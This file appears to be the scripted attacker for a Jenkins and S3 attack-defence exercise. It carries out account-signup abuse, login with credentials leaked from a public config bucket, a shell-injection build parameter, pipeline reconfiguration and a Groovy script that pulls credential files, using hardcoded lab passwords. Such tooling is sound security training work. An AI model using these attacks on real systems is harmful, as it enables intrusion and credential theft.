import concurrent.futures
import json
import os
import re
import shlex
import time
from abc import ABC, abstractmethod
from collections.abc import Callable, Mapping, Sequence
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Any, NamedTuple, override
from urllib.parse import urlparse, urlunparse

import boto3
import jenkins
import paramiko
import requests
import structlog
from botocore.config import Config as BotoConfig
from botocore.exceptions import ClientError
from bs4 import BeautifulSoup, Tag
from faker import Faker
from httpx import Client as HttpClient
from jenkins import Jenkins
from yaml import safe_load

from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult

SCRIPT_DIR = Path(__file__).parent.resolve()
KEY_DIR = SCRIPT_DIR / "keys"

logger = structlog.stdlib.get_logger("deployment_hell")


class GaragePorts(Enum):
    # keep-sorted start
    ADMIN = 3902
    RPC = 3901
    S3 = 3900
    WEB = 3903
    # keep-sorted end


class JenkinsPorts(Enum):
    SSH = 2222
    WEB = 8080
    AGENT = 50000


@dataclass
class Credentials:
    username: str
    password: str

    full_name: str | None = None
    email: str | None = None

    key_path: os.PathLike[str] | None = None

    @property
    def public_key_path(self) -> str | None:
        if self.key_path is None:
            return None
        key_name = Path(self.key_path).name
        return f"{key_name}.pub"


@dataclass
class S3Credentials:
    access_key: str
    secret_key: str
    region: str = "garage"
    garage_host: str = "deployment-hell.thegreatreset.ca"


class UrlComponents(NamedTuple):
    scheme: str = "http"
    netloc: str = "localhost:8080"
    url: str = "/"
    path: str = ""
    query: str = ""
    fragment: str = ""

    @classmethod
    def make_netloc(cls, hostname: str, port: int):
        return f"{hostname}:{port}"


class GarageHost:
    base_domain: str = "deployment-hell.thegreatreset.ca"
    s3_subdomain: str = "s3"
    web_subdomain: str = "web"

    def _make_url(
        self,
        port: int,
        subdomain: str | None = None,
    ):
        fqdn = self.base_domain
        if subdomain is not None:
            fqdn = f"{subdomain}.{self.base_domain}"

        components = UrlComponents(netloc=f"{fqdn}:{port}")
        return urlunparse(components)

    @property
    def endpoint_url(self):
        return self._make_url(GaragePorts.S3.value)

    @property
    def s3_web_url(self):
        return self._make_url(GaragePorts.WEB.value, self.web_subdomain)

    @property
    def s3_api_url(self):
        return self._make_url(GaragePorts.S3.value, self.s3_subdomain)

    def s3_bucket_web_url(self, bucket: str):
        web_url = urlparse(self.s3_web_url)
        bucket_web_url = web_url._replace(
            netloc=f"{bucket}.{web_url.hostname}:{GaragePorts.WEB.value}"
        ).geturl()
        return bucket_web_url


@dataclass
class JenkinsJob:
    name: str
    url: str
    color: str
    fullname: str

    @classmethod
    def from_jenkins_job(cls, job: Any):
        return cls(
            name=job["name"],
            url=job["url"],
            color=job.get("color", ""),
            fullname=job["fullname"],
        )


class AttackFailedException(Exception):
    pass


class DeploymentHellAttacker(Attacker):
    def timeout(
        self,
        request: Callable[[int, int, int], AttackResult],
        id: int,
        tick: int,
        sequence_no: int,
        timeout: int = 5,
    ) -> AttackResult:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            structlog.contextvars.bind_contextvars(
                id=id, tick=tick, sequence_no=sequence_no
            )
            future = executor.submit(request, id, tick, sequence_no)
            result = AttackResult.RESULT_DOWN
            try:
                result = future.result(timeout=timeout)
            except jenkins.JenkinsException as e:
                logger.aerror("ATTACK FAILED: %s", e)
                result = AttackResult.RESULT_FAILURE
            except AttackFailedException as e:
                logger.aerror("ATTACK FAILED: %s", e)
                result = AttackResult.RESULT_FAILURE
            except requests.exceptions.ConnectionError as e:
                logger.aerror("SERVICE DOWN: %s", e)
                result = AttackResult.RESULT_DOWN
            except concurrent.futures.TimeoutError:
                logger.aerror("SERVICE DOWN (Timeout)")
                result = AttackResult.RESULT_DOWN
            except NotImplementedError:
                logger.aerror("METHOD NOT IMPLEMENTED")
                result = AttackResult.RESULT_FAILURE
            except Exception as e:
                logger.exception("UNKNOWN EXCEPTION", e)
                result = AttackResult.RESULT_FAILURE
            finally:
                structlog.contextvars.unbind_contextvars("id", "tick", "sequence_no")

            return result

    @override
    def benign_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        client = BenignClient(self.host)

        return self.timeout(client.route_request, id, tick, sequence_no)

    @override
    def malicious_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        client = MaliciousClient(self.host)

        timeout = 5
        if id == 3:
            timeout = 30  # This is to account for Jenkins build delays

        return self.timeout(
            client.route_request, id, tick, sequence_no, timeout=timeout
        )


class JenkinsClient(ABC):
    @abstractmethod
    def login(self, creds: Credentials) -> bool:
        pass

    @abstractmethod
    def cleanup(self):
        pass

    @abstractmethod
    def list_jobs(self) -> list[JenkinsJob]:
        pass

    @abstractmethod
    def get_job_info(self, name: str) -> dict[str, Any] | None:
        pass

    @abstractmethod
    def get_job_config(self, name: str) -> str:
        pass

    @abstractmethod
    def get_queue_item(self, queue_id: int) -> dict[str, Any]:
        pass

    @abstractmethod
    def get_build_info(self, name: str, build_number: int) -> dict[str, Any]:
        pass

    @abstractmethod
    def get_build_console_output(self, name: str, build_number: int) -> str:
        pass

    @abstractmethod
    def trigger_build(
        self,
        name: str,
        parameters: Mapping[str, Any] | Sequence[tuple[str, Any]] | None,
    ) -> int:
        pass

    @abstractmethod
    def create_job(self, name: str, config_xml: str) -> None:
        pass

    @abstractmethod
    def reconfigure_job(self, name: str, config_xml: str) -> None:
        pass

    @abstractmethod
    def run_script(self, script_path: os.PathLike[str]) -> str | None:
        pass


# # TODO: Rework this
# def _create_job_xml(groovy_script: str) -> str:
#     return f"""
# <?xml version='1.0' encoding='UTF-8'?>
# <flow-definition>
#   <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition">
#     <script>{groovy_script}</script>
#     <sandbox>true</sandbox>
#   </definition>
# </flow-definition>
#         """


class JenkinsHttpClient(JenkinsClient):
    jenkins_server: Jenkins | None = None
    jenkins_url: str

    def __init__(self, jenkins_url: str):
        self.jenkins_url = jenkins_url

    @override
    def login(self, creds: Credentials) -> bool:
        server = Jenkins(self.jenkins_url, creds.username, creds.password)
        user_details = server.get_whoami()
        if user_details.get("fullName") is None:
            return False
        self.jenkins_server = server
        return True

    @override
    def cleanup(self):
        pass

    @override
    def list_jobs(self) -> list[JenkinsJob]:
        if self.jenkins_server is None:
            raise AttackFailedException

        job_dicts = self.jenkins_server.get_all_jobs()
        return [JenkinsJob.from_jenkins_job(job) for job in job_dicts]

    @override
    def get_job_info(self, name: str) -> dict[str, Any]:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.get_job_info(name)

    @override
    def get_job_config(self, name: str) -> str:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.get_job_config(name)

    @override
    def get_queue_item(self, queue_id: int) -> dict[str, object]:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.get_queue_item(queue_id)

    @override
    def get_build_info(self, name: str, build_number: int) -> dict[str, object]:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.get_build_info(name, build_number)

    @override
    def get_build_console_output(self, name: str, build_number: int) -> str:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.get_build_console_output(name, build_number)

    @override
    def trigger_build(
        self,
        name: str,
        parameters: Mapping[str, Any] | Sequence[tuple[str, Any]] | None,
    ) -> int:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.build_job(name, parameters=parameters)

    @override
    def create_job(self, name: str, config_xml: str) -> None:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.create_job(name, config_xml)

    @override
    def reconfigure_job(self, name: str, config_xml: str) -> None:
        if self.jenkins_server is None:
            raise AttackFailedException
        return self.jenkins_server.reconfig_job(name, config_xml)

    @override
    def run_script(self, script_path: os.PathLike[str]) -> str | None:
        if self.jenkins_server is None:
            raise AttackFailedException
        with open(script_path) as groovy_script_fd:
            groovy_script = groovy_script_fd.read()
        return self.jenkins_server.run_script(groovy_script)


class JenkinsSshClient(JenkinsClient):
    host: str
    port: int

    ssh_client: paramiko.SSHClient

    def __init__(self, host: str, port: int = JenkinsPorts.SSH.value):
        self.host = host
        self.port = port
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self._queued_builds: dict[int, dict[str, Any]] = {}
        self._next_queue_id = 1

    @override
    def login(self, creds: Credentials) -> bool:
        try:
            self.ssh_client.connect(
                self.host,
                self.port,
                username=creds.username,
                key_filename=str(creds.key_path),
                look_for_keys=False,
            )
            return True
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException:
            # For some reason Jenkins SSH gives invalid key errors whenever keys fail
            return False

    @override
    def cleanup(self):
        self.ssh_client.close()

    def _exec_cli(self, command: str) -> str:
        transport = self.ssh_client.get_transport()
        if transport is None or not transport.is_active():
            raise AttackFailedException("SSH not connected")

        _, stdout, stderr = self.ssh_client.exec_command(command)
        exit_status = stdout.channel.recv_exit_status()
        out = stdout.read().decode()
        err = stderr.read().decode()

        if exit_status != 0:
            raise AttackFailedException(err.strip() or out.strip() or command)

        return out

    def _exec_cli_with_stdin(self, command: str, stdin_data: str) -> str:
        transport = self.ssh_client.get_transport()
        if transport is None or not transport.is_active():
            raise AttackFailedException("SSH not connected")

        stdin, stdout, stderr = self.ssh_client.exec_command(command)
        stdin.write(stdin_data)
        stdin.channel.shutdown_write()
        exit_status = stdout.channel.recv_exit_status()
        out = stdout.read().decode()
        err = stderr.read().decode()

        if exit_status != 0:
            raise AttackFailedException(err.strip() or out.strip() or command)

        return out

    def _exec_groovy(self, script: str) -> str:
        return self._exec_cli_with_stdin("groovy =", script).strip()

    def _normalize_parameters(
        self,
        parameters: Mapping[str, Any] | Sequence[tuple[str, Any]] | None,
    ) -> list[tuple[str, Any]]:
        if parameters is None:
            return []
        if isinstance(parameters, Mapping):
            return list(parameters.items())
        return list(parameters)

    def _job_url(self, name: str) -> str:
        return f"http://{self.host}:{JenkinsPorts.WEB.value}/job/{name}/"

    @override
    def list_jobs(self) -> list[JenkinsJob]:
        output = self._exec_cli("list-jobs")
        return [
            JenkinsJob(name=name, url=self._job_url(name), color="", fullname=name)
            for line in output.splitlines()
            if (name := line.strip())
        ]

    @override
    def get_job_info(self, name: str) -> dict[str, Any] | None:
        # Minimal dict; full REST JSON not available over SSH CLI.
        # self._exec_cli(f"get-job {name}")
        return {"name": name, "url": self._job_url(name)}

    @override
    def get_job_config(self, name: str) -> str:
        return self._exec_cli(f"get-job {name}")

    @override
    def get_queue_item(self, queue_id: int) -> dict[str, object]:
        if queue_id in self._queued_builds:
            return self._queued_builds[queue_id]

        script = f"""
import jenkins.model.Jenkins
import groovy.json.JsonOutput
import hudson.model.Queue

def item = Jenkins.get().queue.getItem({queue_id})
if (item == null) {{
    throw new IllegalArgumentException("queue item not found")
}}
def result = [id: item.id, task: [name: item.task.name, url: item.task.url]]
if (item instanceof Queue.LeftItem && item.executable != null) {{
    result.executable = [number: item.executable.number, url: item.executable.url]
}}
println JsonOutput.toJson(result)
""".strip()
        return json.loads(self._exec_groovy(script))

    @override
    def get_build_info(self, name: str, build_number: int) -> dict[str, Any]:
        tail = self._exec_cli(f"console {name} {build_number} -n 5")
        building = not any(line.startswith("Finished:") for line in tail.splitlines())
        return {
            "number": build_number,
            "building": building,
            "url": f"{self._job_url(name)}{build_number}/",
        }

    @override
    def get_build_console_output(self, name: str, build_number: int) -> str:
        return self._exec_cli(f"console {name} {build_number}")

    @override
    def trigger_build(
        self,
        name: str,
        parameters: Mapping[str, Any] | Sequence[tuple[str, Any]] | None,
    ) -> int:
        cmd_parts = ["build", shlex.quote(name)]
        for key, val in self._normalize_parameters(parameters):
            cmd_parts.extend(["-p", shlex.quote(f"{key}={val}")])
        cmd_parts.append("-w")

        output = self._exec_cli(" ".join(cmd_parts))
        match = re.search(r"Started .+ #(\d+)", output)
        if match is None:
            raise AttackFailedException(f"Unexpected build output: {output!r}")

        build_number = int(match.group(1))
        queue_id = self._next_queue_id
        self._next_queue_id += 1
        self._queued_builds[queue_id] = {
            "id": queue_id,
            "task": {"name": name, "url": self._job_url(name)},
            "executable": {
                "number": build_number,
                "url": f"{self._job_url(name)}{build_number}/",
            },
        }
        return queue_id

    @override
    def create_job(self, name: str, config_xml: str) -> None:
        self._exec_cli_with_stdin(f"create-job {name}", config_xml)

    @override
    def reconfigure_job(self, name: str, config_xml: str) -> None:
        self._exec_cli_with_stdin(f"update-job {name}", config_xml)

    @override
    def run_script(self, script_path: os.PathLike[str]) -> str | None:
        with open(script_path) as groovy_script_fd:
            groovy_script = groovy_script_fd.read()
        output = self._exec_cli_with_stdin("groovy =", groovy_script)
        return output.rstrip("\n")


class GarageClient:
    garage_host: GarageHost
    creds: S3Credentials
    s3_client: Any

    def __init__(
        self, creds: S3Credentials, garage_host: GarageHost | None = None
    ) -> None:
        if garage_host is None:
            self.garage_host = GarageHost()
        else:
            self.garage_host = garage_host
        self.creds = creds

        # TODO: Initialize S3 client
        s3_config = BotoConfig(region_name=self.creds.region)
        self.s3_client = boto3.client(
            "s3",
            config=s3_config,
            aws_access_key_id=self.creds.access_key,
            aws_secret_access_key=self.creds.secret_key,
            endpoint_url=self.garage_host.endpoint_url,
        )

    def get_file(self, bucket: str, object_key: str, out_file_name: str):
        try:
            self.s3_client.download_file(bucket, object_key, out_file_name)
            return True
        except ClientError:
            return False

    def upload_file(self, file_path: os.PathLike[str], bucket: str):
        try:
            object_name = os.path.basename(file_path)
            _ = self.s3_client.upload_file(file_path, bucket, object_name)
            return True
        except ClientError:
            return False


class Client(ABC):
    # keep-sorted start
    garage_admin_port: int = GaragePorts.ADMIN.value
    garage_rpc_port: int = GaragePorts.RPC.value
    garage_s3_port: int = GaragePorts.S3.value
    garage_web_port: int = GaragePorts.WEB.value
    jenkins_agent_port: int = JenkinsPorts.AGENT.value
    jenkins_web_port: int = JenkinsPorts.WEB.value
    jenkins_ssh_port: int = JenkinsPorts.SSH.value
    # keep-sorted end

    host: str
    jenkins_client: JenkinsClient

    sofia_creds: Credentials = Credentials(
        username="sofia.bernhard",
        password="sofia.bernhard123",
        key_path=KEY_DIR / "sofia.bernhard",
    )
    michael_creds: Credentials = Credentials(
        username="michael.fateh",
        password="e38fce4d56c445d6910bab2b63a06d25166d5523ba9871d32744f3ea8d857eaa",
        key_path=KEY_DIR / "michael.fateh",
    )
    admin_creds: Credentials = Credentials(
        username="admin",
        password="3af23c474f6c4c6ebaca02e743433043",
        key_path=KEY_DIR / "admin",
    )

    @property
    def jenkins_url(self):
        return f"http://{self.host}:{self.jenkins_web_port}"

    def __init__(self, host: str):
        self.host = host
        self.use_http_jenkins()

    def use_http_jenkins(self):
        self.jenkins_client = JenkinsHttpClient(self.jenkins_url)

    def use_ssh_jenkins(self):
        self.jenkins_client = JenkinsSshClient(self.host, JenkinsPorts.SSH.value)

    def _wait_for_build(
        self, job_name: str, queue_id: int, timeout: float = 10.0
    ) -> int:
        """Poll queue -> get build number -> poll build until done. Returns build number."""

        deadline = time.time() + timeout
        build_number = None

        while time.time() < deadline:
            queue_info = self.jenkins_client.get_queue_item(queue_id)
            executable = queue_info.get("executable")
            if executable is not None:
                build_number = executable["number"]
                break

            time.sleep(1)

        logger.debug("Build number obtained. Waiting for build to execute...")

        if build_number is None:
            raise AttackFailedException("Build never started")

        while time.time() < deadline:
            build_info = self.jenkins_client.get_build_info(job_name, build_number)
            if build_info.get("building") is False:
                return build_number
            time.sleep(1)

        raise AttackFailedException("Build timed out")

    @abstractmethod
    def route_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        pass

    # INFO: Do we want a retry loop here?


class MaliciousClient(Client):
    @override
    def route_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        result = AttackResult.RESULT_FAILURE
        match id:
            case 1:
                result = self.request_signup(tick, sequence_no)
            case 2:
                result = self.request_exposed_credential_login(tick, sequence_no)
            case 3:
                result = self.request_shell_injection(tick, sequence_no)
            case 4:
                result = self.request_pipeline_reset(tick, sequence_no)
            case 5:
                result = self.request_aws_keys(tick, sequence_no)
            case _:
                pass

        self.jenkins_client.cleanup()
        return result

    def try_login(self, available_credentials: list[Credentials]) -> Credentials | None:
        creds = None
        for cred_set in available_credentials:
            result = self.jenkins_client.login(cred_set)
            if result:
                creds = cred_set
        return creds

    def make_credentials(self, tick: int, sequence_no: int) -> Credentials:
        seed = hash(f"{tick}:{sequence_no}")
        fake = Faker()
        fake.seed_instance(seed)
        creds = Credentials(
            username=fake.user_name(),
            password=fake.password(),
            full_name=fake.name(),
            email=fake.email(),
        )
        return creds

    def _find_jenkins_crumb(self, tag: Tag):
        if tag.name != "input":
            return False
        if tag.get("name") != "Jenkins-Crumb":
            return False
        return True

    def request_signup(self, tick: int, sequence_no: int) -> AttackResult:
        creds = self.make_credentials(tick, sequence_no)
        if creds.full_name is None or creds.email is None:
            raise AttackFailedException("Invalid credentials")

        with HttpClient(base_url=self.jenkins_url) as http_client:
            res = http_client.get("/signup")
            if res.status_code != 200:
                raise AttackFailedException("Signup page unreachable.")
            parsed_html = BeautifulSoup(res.text, "html.parser")
            jenkins_crumb_tag = parsed_html.find(self._find_jenkins_crumb)
            if jenkins_crumb_tag is None:
                raise AttackFailedException("Could not find Jenkins Crumb.")

            jenkins_crumb = jenkins_crumb_tag.get("value")

            signup_res = http_client.post(
                "/securityRealm/createAccount",
                data={
                    "username": creds.username,
                    "fullname": creds.full_name,
                    "email": creds.email,
                    "password1": creds.password,
                    "password2": creds.password,
                    "Submit": "",
                    "Jenkins-Crumb": jenkins_crumb,
                },
            )
            if signup_res.status_code != 200:
                raise AttackFailedException("Signup failed.")

        return AttackResult.RESULT_SUCCESS

    def _get_user_from_config(self, config: dict[str, Any], username: str):
        try:
            user_list = config["jenkins"]["securityRealm"]["local"]["users"]
            user = next(filter(lambda user: user["id"] == username, user_list))
            return user
        except KeyError as e:
            raise AttackFailedException(f"{username} not found in config") from e

    def request_exposed_credential_login(
        self, tick: int, sequence_no: int
    ) -> AttackResult:
        garage_host = GarageHost()

        config_bucket_url = garage_host.s3_bucket_web_url("config")

        with HttpClient(base_url=config_bucket_url) as http_client:
            config_file_res = http_client.get("/jenkins.yaml")

            if config_file_res.status_code != 200:
                raise AttackFailedException("Could not get jenkins.yaml file")

            config_data = safe_load(config_file_res.text)

            admin = self._get_user_from_config(config_data, "admin")

        creds = Credentials(username=admin["id"], password=admin["password"])

        if self.jenkins_client.login(creds):
            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def request_shell_injection(self, tick: int, sequence_no: int) -> AttackResult:
        creds = self.sofia_creds
        if not self.jenkins_client.login(creds):
            raise AttackFailedException("Login failed")

        marker = f"INJECTION_OK_{tick}_{sequence_no}"
        payload = f"canary || echo {marker} && exit 1;#"

        queue_id = self.jenkins_client.trigger_build(
            "build-and-upload", {"projectName": payload}
        )

        build_number = self._wait_for_build("build-and-upload", queue_id, timeout=30)
        console = self.jenkins_client.get_build_console_output(
            "build-and-upload", build_number
        )

        matches = re.search(f"^{marker}$", console, re.MULTILINE)
        if matches is None:
            raise AttackFailedException("Could not find echo marker")

        return AttackResult.RESULT_SUCCESS

    def request_aws_keys(self, tick: int, sequence_no: int) -> AttackResult:
        for cred_set in [self.sofia_creds, self.michael_creds, self.admin_creds]:
            result = self.jenkins_client.login(cred_set)
            if not result:
                continue

            script_output = self.jenkins_client.run_script(
                SCRIPT_DIR / "exfilAwsKeys.groovy"
            )

            if script_output is None:
                continue
            key_data: dict[str, str] = json.loads(script_output)

            if (
                key_data.get("/shared/garage-creds.env") is None
                and key_data.get("/shared/jenkins-config-creds.env") is None
            ):
                continue

            return AttackResult.RESULT_SUCCESS

        return AttackResult.RESULT_FAILURE

    def request_pipeline_reset(self, _tick: int, _sequence_no: int) -> AttackResult:
        with open(SCRIPT_DIR / "pipeline-reset.xml") as config_xml_fd:
            config_xml = config_xml_fd.read()

        creds = self.try_login([self.sofia_creds, self.michael_creds])

        if creds is None:
            raise AttackFailedException("Login failed")

        self.jenkins_client.reconfigure_job("build-and-upload", config_xml)

        return AttackResult.RESULT_SUCCESS


class BenignClient(Client):
    @override
    def route_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        result = AttackResult.RESULT_FAILURE
        match id:
            case 1:
                result = self.request_authenticate(
                    tick, sequence_no, creds=self.sofia_creds
                )
            case 2:
                result = self.request_canary_build(tick, sequence_no)
            case 3:
                result = self.request_authenticate(
                    tick, sequence_no, creds=self.michael_creds
                )
            case 4:
                result = self.request_authenticate(
                    tick, sequence_no, creds=self.admin_creds
                )
            case 5:
                result = self.request_plugin_export(tick, sequence_no)
            case _:
                result = AttackResult.RESULT_FAILURE

            # TODO: Maybe an admin running the pluginExport script as a sanity check

        self.jenkins_client.cleanup()
        return result

    # Only the legit users have SSH keys
    def try_login(self, creds: Credentials):
        self.use_ssh_jenkins()
        login_result = self.jenkins_client.login(creds)
        if login_result:
            return True
        self.use_http_jenkins()
        login_result = self.jenkins_client.login(creds)
        return login_result

    def request_authenticate(
        self, _tick: int, _sequence_no: int, creds: Credentials
    ) -> AttackResult:
        login_result = self.try_login(creds)
        match login_result:
            case True:
                return AttackResult.RESULT_SUCCESS
            case False:
                return AttackResult.RESULT_FAILURE

    def request_canary_build(self, _tick: int, _sequence_no: int) -> AttackResult:
        creds = self.michael_creds
        logged_in = self.try_login(creds)
        if not logged_in:
            return AttackResult.RESULT_FAILURE

        jobs = self.jenkins_client.list_jobs()

        build_and_upload_job = None
        for job in jobs:
            if job.name != "build-and-upload":
                continue
            build_and_upload_job = job

        if build_and_upload_job is None:
            raise AttackFailedException

        queue_number = self.jenkins_client.trigger_build(
            build_and_upload_job.name, {"projectName": "canary"}
        )
        _ = self.jenkins_client.get_queue_item(queue_number)

        return AttackResult.RESULT_SUCCESS

    def request_plugin_export(self, _tick: int, _sequence_no: int) -> AttackResult:
        if not self.try_login(self.admin_creds):
            raise AttackFailedException("Admin login failed!")

        script_output = self.jenkins_client.run_script(
            SCRIPT_DIR / "pluginExport.groovy"
        )

        if script_output is None:
            raise AttackFailedException("Script execution failed")

        return AttackResult.RESULT_SUCCESS
